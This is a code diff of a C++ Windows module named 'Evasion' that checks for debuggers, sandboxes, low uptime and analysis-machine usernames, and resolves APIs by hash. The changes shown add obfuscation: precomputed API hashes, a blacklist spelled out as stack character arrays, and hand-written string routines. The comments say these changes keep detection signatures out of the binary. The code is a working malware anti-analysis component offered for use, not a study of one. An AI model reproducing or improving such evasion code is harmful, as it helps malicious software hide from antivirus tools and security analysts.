@@ -13,6 +13,14 @@
 #include <intrin.h>
 #include <winternl.h> // Required for PPEB
 
+// Pre-computed CRC32C hashes (polynomial 0x82F63B78) for API names
+// Avoids string literals in .rdata that could serve as detection signatures
+static constexpr DWORD HASH_CheckRemoteDebuggerPresent = 0x375CA861;
+static constexpr DWORD HASH_GetSystemInfo              = 0xE13E1A8C;
+static constexpr DWORD HASH_GlobalMemoryStatusEx       = 0xCEEF3955;
+static constexpr DWORD HASH_GetTickCount64             = 0x17ABCBE7;
+static constexpr DWORD HASH_GetUserNameW               = 0x3F75D701;
+
 namespace Evasion
 {
     // ----------------------------------------------------------------------
@@ -47,7 +55,7 @@ namespace Evasion
 
         typedef BOOL(WINAPI* pfnCheckRemoteDebuggerPresent)(HANDLE, PBOOL);
         auto pCheckRemoteDebuggerPresent = (pfnCheckRemoteDebuggerPresent)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("CheckRemoteDebuggerPresent"));
+            hK32, HASH_CheckRemoteDebuggerPresent);
         if (!pCheckRemoteDebuggerPresent) return false;
 
         BOOL isDebuggerPresent = FALSE;
@@ -95,7 +103,7 @@ namespace Evasion
 
         typedef void(WINAPI* pfnGetSystemInfo)(LPSYSTEM_INFO);
         auto pGetSystemInfo = (pfnGetSystemInfo)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("GetSystemInfo"));
+            hK32, HASH_GetSystemInfo);
         if (!pGetSystemInfo) return false;
 
         SYSTEM_INFO sysInfo;
@@ -113,7 +121,7 @@ namespace Evasion
 
         typedef BOOL(WINAPI* pfnGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
         auto pGlobalMemoryStatusEx = (pfnGlobalMemoryStatusEx)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("GlobalMemoryStatusEx"));
+            hK32, HASH_GlobalMemoryStatusEx);
         if (!pGlobalMemoryStatusEx) return false;
 
         MEMORYSTATUSEX statex;
@@ -162,7 +170,7 @@ namespace Evasion
 
         typedef ULONGLONG(WINAPI* pfnGetTickCount64)();
         auto pGetTickCount64 = (pfnGetTickCount64)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("GetTickCount64"));
+            hK32, HASH_GetTickCount64);
         if (!pGetTickCount64) return false;
 
         // Sandboxes typically have very low uptime (just booted for analysis)
@@ -180,7 +188,7 @@ namespace Evasion
 
         typedef BOOL(WINAPI* pfnGetUserNameW)(LPWSTR, LPDWORD);
         auto pGetUserNameW = (pfnGetUserNameW)Api::GetProcByHashCrc(
-            hAdv, Crc32C::ConstHash("GetUserNameW"));
+            hAdv, HASH_GetUserNameW);
         if (!pGetUserNameW) return false;
 
         // Common sandbox/analysis usernames
@@ -188,21 +196,50 @@ namespace Evasion
         DWORD size = 256;
         pGetUserNameW(username, &size);
 
-        // Convert to lowercase for comparison (towlower is CRT intrinsic)
+        // Convert to lowercase without CRT (no towlower)
         for (DWORD i = 0; i < size && username[i]; i++)
-            username[i] = (wchar_t)towlower(username[i]);
+        {
+            wchar_t ch = username[i];
+            if (ch >= L'A' && ch <= L'Z') ch += 32;
+            username[i] = ch;
+        }
 
-        const wchar_t* blacklist[] = {
-            L"sandbox", L"malware", L"virus", L"maltest",
-            L"currentuser", L"user", L"admin", L"test",
-            L"john", L"anna", L"emily", L"sample",
-            NULL
+        // Build blacklist words as stack arrays (no .rdata string literals)
+        wchar_t w0[]  = { L's', L'a', L'n', L'd', L'b', L'o', L'x', 0 };
+        wchar_t w1[]  = { L'm', L'a', L'l', L'w', L'a', L'r', L'e', 0 };
+        wchar_t w2[]  = { L'v', L'i', L'r', L'u', L's', 0 };
+        wchar_t w3[]  = { L'm', L'a', L'l', L't', L'e', L's', L't', 0 };
+        wchar_t w4[]  = { L'c', L'u', L'r', L'r', L'e', L'n', L't', L'u', L's', L'e', L'r', 0 };
+        wchar_t w5[]  = { L'u', L's', L'e', L'r', 0 };
+        wchar_t w6[]  = { L'a', L'd', L'm', L'i', L'n', 0 };
+        wchar_t w7[]  = { L't', L'e', L's', L't', 0 };
+        wchar_t w8[]  = { L'j', L'o', L'h', L'n', 0 };
+        wchar_t w9[]  = { L'a', L'n', L'n', L'a', 0 };
+        wchar_t w10[] = { L'e', L'm', L'i', L'l', L'y', 0 };
+        wchar_t w11[] = { L's', L'a', L'm', L'p', L'l', L'e', 0 };
+
+        wchar_t* blacklist[] = {
+            w0, w1, w2, w3, w4, w5, w6, w7, w8, w9, w10, w11, NULL
         };
 
+        // Manual substring search (no wcsstr / CRT dependency)
         for (int i = 0; blacklist[i] != NULL; i++)
         {
-            if (wcsstr(username, blacklist[i]) != NULL)
-                return true;
+            wchar_t* needle = blacklist[i];
+            // Compute needle length
+            int nLen = 0;
+            while (needle[nLen]) nLen++;
+            if (nLen == 0) continue;
+
+            // Slide over username looking for a match
+            for (DWORD j = 0; username[j]; j++)
+            {
+                int k = 0;
+                while (k < nLen && username[j + k] == needle[k])
+                    k++;
+                if (k == nLen)
+                    return true; // Substring found
+            }
         }
         return false;
     }
